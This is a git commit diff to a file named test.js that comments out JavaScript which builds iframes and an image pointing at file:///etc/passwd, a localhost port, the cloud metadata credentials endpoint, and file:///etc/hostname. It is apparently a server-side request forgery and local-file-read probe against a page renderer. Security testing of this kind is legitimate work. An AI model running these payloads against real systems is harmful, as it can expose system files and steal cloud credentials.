4360b4674e676ea2860e9f109380d3da4816ffb7
vignesh1521 <86752377+vignesh1521@users.noreply.github.com>
2026-09-16 07:32:37 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,27 +1,27 @@
 
-var f1 = document.createElement('iframe');
-f1.src = 'file:///etc/passwd';
-f1.width = '800';
-f1.height = '400';
-document.body.appendChild(f1);
+// var f1 = document.createElement('iframe');
+// f1.src = 'file:///etc/passwd';
+// f1.width = '800';
+// f1.height = '400';
+// document.body.appendChild(f1);
 
-var f2 = document.createElement('iframe');
-f2.src = 'http://localhost:8080/';
-f2.width = '800';
-f2.height = '300';
-document.body.appendChild(f2);
+// var f2 = document.createElement('iframe');
+// f2.src = 'http://localhost:8080/';
+// f2.width = '800';
+// f2.height = '300';
+// document.body.appendChild(f2);
 
-var f3 = document.createElement('iframe');
-f3.src = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-f3.width = '800';
-f3.height = '200';
-document.body.appendChild(f3);
+// var f3 = document.createElement('iframe');
+// f3.src = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+// f3.width = '800';
+// f3.height = '200';
+// document.body.appendChild(f3);
 
-var im = document.createElement('img');
-im.src = 'file:///etc/hostname';
-im.width = '1';
-im.height = '1';
-document.body.appendChild(im);
+// var im = document.createElement('img');
+// im.src = 'file:///etc/hostname';
+// im.width = '1';
+// im.height = '1';
+// document.body.appendChild(im);
 
 var i = document.createElement('div');
 i.src = 'hey there';
